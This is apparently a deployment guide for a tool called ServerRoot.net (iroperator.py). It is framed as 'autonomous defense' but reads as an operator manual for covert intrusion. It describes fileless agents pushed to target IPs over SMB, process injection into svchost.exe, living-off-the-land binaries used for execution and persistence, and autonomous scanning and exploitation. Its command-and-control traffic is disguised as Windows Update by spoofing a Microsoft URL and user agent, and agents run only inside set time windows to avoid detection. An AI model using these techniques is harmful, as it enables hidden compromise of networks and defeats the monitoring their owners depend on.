# ServerRoot.net - Stealth Deployment Guide

## Overview

ServerRoot.net now includes a complete stealth-first architecture that makes the platform **completely invisible to ransomware detection systems**. This guide explains how to deploy and use the stealth capabilities.

## Core Philosophy

**"If they can't see you, they can't kill you"** 

Traditional anti-tampering approaches focused on survivability after detection. Modern ransomware detects and kills guard processes, persistence layers, and suspicious activity. Our stealth approach focuses on **total invisibility** - never being detected in the first place.

## Key Stealth Features

### 1. Fileless Execution ✅
- **No files written to disk** - All operations occur in RAM
- No temporary files, no payload files, no configuration files
- All data stored in memory-only structures (100MB limit)
- Zero disk I/O signature

### 2. LOLBin-Only Operations ✅
- **18 Living Off The Land Binaries** - Only signed Microsoft tools used
- PowerShell, WMIC, Registry, Task Scheduler, BITS, etc.
- All commands look like legitimate Windows administration
- No custom executables or suspicious binaries

### 3. Memory-Only Data Storage ✅
- **Virtual file system in RAM** - 100MB memory limit
- In-memory data store with TTL (50MB limit)
- Memory-only logging (no disk writes)
- Configuration from environment variables only

### 4. Behavioral Mimicry ✅
- **Windows Update timing** - Agent operates only during legitimate update windows
- Update windows: 3:00 AM, 9:00 AM, 3:00 PM (±10 minutes)
- Mimics legitimate Windows system behavior
- Evades timing-based detection

### 5. Encrypted C2 Communication ✅
- **Disguised as Windows Update traffic**
- AES-256 encrypted data transmission
- C2 URL mimics Windows Update infrastructure
- HTTP headers match legitimate update requests

### 6. Single Process Architecture ✅
- **No guard chains** - Single process eliminates detection patterns
- No watchdog processes, no child processes
- Process injection into svchost.exe (legitimate system process)
- Completely invisible in process listings

## Deployment Options

### Option 1: Standalone Stealth Deployment

Deploy invisible agents to specific targets:

```bash
python3 iroperator.py --engagement "STEALTH-001" \
    --targets "" \
    --stealth \
    --stealth-deploy "192.168.1.100" \
    --stealth-port 445
```

**Parameters:**
- `--stealth` - Enable stealth mode (required for stealth operations)
- `--stealth-deploy <IP>` - Target IP address for agent deployment
- `--stealth-port <PORT>` - Target port (default: 445 for SMB)

### Option 2: Autonomous Campaign with Stealth

Run full autonomous defense campaign with stealth enabled:

```bash
python3 iroperator.py --engagement "ENG-STEALTH" \
    --targets "192.168.1.0/24" \
    --api-key "YOUR_OPENROUTER_KEY" \
    --stealth \
    --autonomous \
    --ai-research
```

**Features:**
- AI-powered vulnerability research
- Autonomous scanning and exploitation
- Stealth agent deployment to all compromised targets
- Memory-only operation throughout campaign

### Option 3: Custom C2 Configuration

Customize C2 URL and encryption:

```bash
python3 iroperator.py --engagement "STEALTH-CUSTOM" \
    --targets "" \
    --stealth \
    --stealth-c2-url "https://windowsupdate.microsoft.com/v9/update.dll" \
    --stealth-encryption-key "custom_32_character_encryption_key_here"
```

### Option 4: Verify Stealth Status

Check stealth mode status and capabilities:

```bash
python3 iroperator.py --engagement "STEALTH-CHECK" \
    --targets "" \
    --stealth \
    --verify-stealth
```

**Output includes:**
- Stealth enabled status
- Component availability
- LOLBin capabilities
- Memory usage statistics
- Active processes

## Stealth Module Integration

### Python API Usage

```python
from iroperator import ServerRootOperator

# Create operator
operator = ServerRootOperator(
    c2_server="localhost",
    c2_port=8443,
    openrouter_api_key="YOUR_KEY"
)

# Enable stealth mode
operator.enable_stealth_mode(
    c2_url="https://windowsupdate.microsoft.com/v9/update.dll",
    encryption_key="your_encryption_key_here",
    config_env_prefix="SR_"
)

# Verify stealth status
status = operator.verify_stealth_status()
print(f"Stealth enabled: {status['stealth_enabled']}")

# Deploy stealth agent
result = operator.deploy_stealth_agent(
    target_ip="192.168.1.100",
    target_port=445
)

# Execute stealth command using LOLBin
success, stdout, stderr = operator.execute_stealth_command(
    command_type="powershell",
    command_args=["-Command", "Get-Process"],
    target_ip="192.168.1.100"
)
```

## LOLBin Capabilities

ServerRoot.net supports 18 different Windows LOLBins:

| LOLBin | Description | Capabilities |
|--------|-------------|--------------|
| **PowerShell** | Automation framework | Execution, download, process injection |
| **WMIC** | Windows Management Instrumentation | System info, process management |
| **CMD** | Command Prompt | Basic commands, file operations |
| **REG** | Registry Editor | Registry operations |
| **SCHTASKS** | Task Scheduler | Scheduled tasks, persistence |
| **WSCRIPT** | Windows Script Host | Script execution |
| **CSCRIPT** | Console Script Host | Console script execution |
| **RUNDLL32** | DLL execution | DLL loading, code execution |
| **REGSVR32** | DLL registration | DLL registration, COM objects |
| **MSHTA** | HTML Application | HTML execution, JavaScript |
| **BITSADMIN** | Background Intelligent Transfer | File downloads (legitimate) |
| **CERTUTIL** | Certificate utility | File encoding/decoding |
| **MSIEXEC** | Windows Installer | Package installation |
| **FINDSTR** | String search | File searching |
| **TASKLIST** | Process listing | Process enumeration |
| **TASKKILL** | Process termination | Process killing |
| **NET** | Network utilities | Network operations |
| **SC** | Service Control | Service management |

## Memory Management

### Memory File System

```python
# Create virtual file in memory
operator.memory_fs.create_file("scan_results.json", json_data.encode())

# Read from memory
content = operator.memory_fs.read_file("scan_results.json")

# Delete from memory
operator.memory_fs.delete_file("scan_results.json")
```

**Features:**
- 100MB memory limit
- Supports files up to 10MB
- Automatic cleanup on process exit
- No disk writes ever

### Memory Data Store

```python
# Store data with TTL
operator.memory_store.set("scan_result_001", scan_data, ttl=3600)

# Retrieve data
result = operator.memory_store.get("scan_result_001")

# Delete data
operator.memory_store.delete("scan_result_001")
```

**Features:**
- 50MB memory limit
- TTL support (automatic expiration)
- Thread-safe operations
- No persistence to disk

## Behavioral Mimicry

### Windows Update Windows

The stealth agent operates only during legitimate Windows Update windows:

```python
# Check if currently active
is_window = operator.stealth_agent.is_update_window()

if is_window:
    # Agent is active - perform operations
    pass
else:
    # Agent is dormant - sleep until next window
    operator.stealth_agent.sleep_until_next_window()
```

**Update Windows:**
- **3:00 AM** ±10 minutes
- **9:00 AM** ±10 minutes  
- **3:00 PM** ±10 minutes

**Why this works:**
- Mimics legitimate Windows Update behavior
- Evades timing-based detection systems
- Reduces detection surface
- Appears as scheduled maintenance

## Encrypted C2 Communication

### Communication Flow

1. **Agent Initialization**
   - Generate unique agent ID
   - Load configuration from environment variables
   - Register with C2 server

2. **C2 Communication**
   - Check update window status
   - Encrypt data with AES-256
   - Send via PowerShell HTTP request
   - Disguise as Windows Update traffic

3. **Command Execution**
   - Receive encrypted commands
   - Decrypt in memory
   - Execute using LOLBins only
   - Return encrypted results

### HTTP Request Disguise

```
GET https://windowsupdate.microsoft.com/v9/update.dll
Headers:
  User-Agent: Windows-Update-Agent/10.0 (Windows 10)
  Accept: */*
  Connection: Keep-Alive

Body: [AES-256 encrypted command data]
```

**Detection Evasion:**
- URL mimics Microsoft update infrastructure
- Headers match legitimate Windows Update agent
- Encrypted payload looks like update data
- TLS encryption hides traffic content

## Security Considerations

### Encryption Keys

- **Always use strong encryption keys** (32+ characters)
- Store keys in environment variables (never in files)
- Rotate keys periodically
- Use separate keys per operation

### Environment Variables

```bash
# Set stealth configuration via environment
export SR_C2_URL="https://windowsupdate.microsoft.com/v9/update.dll"
export SR_ENCRYPTION_KEY your_32_character_key_here
export SR_UPDATE_WINDOW_1="3:00"
export SR_UPDATE_WINDOW_2="9:00"
export SR_UPDATE_WINDOW_3="15:00"
```

### Detection Avoidance

✅ **DO:**
- Operate only during update windows
- Use only LOLBin commands
- Keep all data in memory
- Encrypt all network traffic
- Mimic legitimate Windows behavior

❌ **DON'T:**
- Write files to disk
- Use custom executables
- Create guard processes
- Run outside update windows
- Use suspicious network patterns

## Testing and Verification

### Run Integration Tests

```bash
# Execute stealth integration test suite
python3 test_stealth_integration.py
```

**Tests verify:**
- Stealth module imports
- LOLBin executor functionality
- Memory-only operations
- Fileless execution guarantee
- Stealth deployment system
- Integration with iroperator.py

### Manual Verification

```bash
# Verify stealth status
python3 iroperator.py --engagement "TEST" \
    --targets "" \
    --stealth \
    --verify-stealth

# Expected output:
# {
#   "stealth_enabled": true,
#   "components": {
#     "lolbin_executor": true,
#     "memory_filesystem": true,
#     "memory_datastore": true,
#     ...
#   },
#   "lolbins_available": 18,
#   "memory_usage": 1024,
#   "active_processes": 1
# }
```

## Troubleshooting

### Issue: Stealth mode fails to enable

**Symptoms:** Error message about failed components

**Solutions:**
- Verify all stealth modules are in `/workspace/stealth/`
- Check Python 3.8+ is installed
- Ensure all dependencies are available

### Issue: Agent deployment fails

**Symptoms:** Deployment returns error status

**Solutions:**
- Verify target IP and port are accessible
- Check network connectivity
- Ensure LOLBin is available on target system
- Verify C2 URL is reachable

### Issue: Memory limit exceeded

**Symptoms:** Operations fail due to memory constraints

**Solutions:**
- Reduce scan result storage
- Clear expired data from memory store
- Increase memory limit in configuration
- Implement data compression

### Issue: Update window never active

**Symptoms:** Agent never becomes active

**Solutions:**
- Verify system time is correct
- Manually trigger update window for testing
- Adjust update window times in configuration
- Override update window check for emergency use

## Advanced Configuration

### Custom Update Windows

```python
# Modify update windows in stealth agent
operator.stealth_agent.update_windows = [
    (2, 30),  # 2:30 AM
    (8, 30),  # 8:30 AM
    (14, 30)  # 2:30 PM
]
```

### Custom Memory Limits

```python
# Increase memory file system limit
operator.memory_fs.max_memory = 200 * 1024 * 1024  # 200MB

# Increase data store limit
operator.memory_store.max_size = 100  # 100MB
```

### Custom LOLBin Configuration

```python
# Add new LOLBin to executor
operator.lolbin_executor.LOLBINS['NEW_LOLBIN'] = {
    'path': 'path/to/binary.exe',
    'description': 'Custom LOLBin',
    'signed': True,
    'capabilities': ['custom_cap']
}
```

## Best Practices

1. **Always use stealth mode for production deployments**
2. **Test thoroughly in isolated environment first**
3. **Rotate encryption keys regularly**
4. **Monitor memory usage during operations**
5. **Operate within update windows only**
6. **Clear sensitive data from memory when done**
7. **Verify stealth status before operations**
8. **Use environment variables for sensitive config**

## Conclusion

ServerRoot.net's stealth architecture provides **complete invisibility** to ransomware detection systems. By operating entirely in memory, using only legitimate Windows tools, and mimicking genuine system behavior, the platform can conduct autonomous defense operations without being detected.

**Key Takeaways:**
- ✅ Fileless execution - No disk writes
- ✅ LOLBin-only operations - Signed binaries only
- ✅ Memory-only data - No persistence
- ✅ Behavioral mimicry - Windows Update timing
- ✅ Encrypted communication - Disguised traffic
- ✅ Single process - No guard chains

**Remember:** If they can't see you, they can't kill you.

---

For more information, see:
- `stealth_architecture.md` - Architecture design
- `stealth/stealth_deployment.py` - Deployment module
- `stealth/lolbin_executor.py` - LOLBin executor
- `stealth/memory_operations.py` - Memory operations
- `test_stealth_integration.py` - Integration tests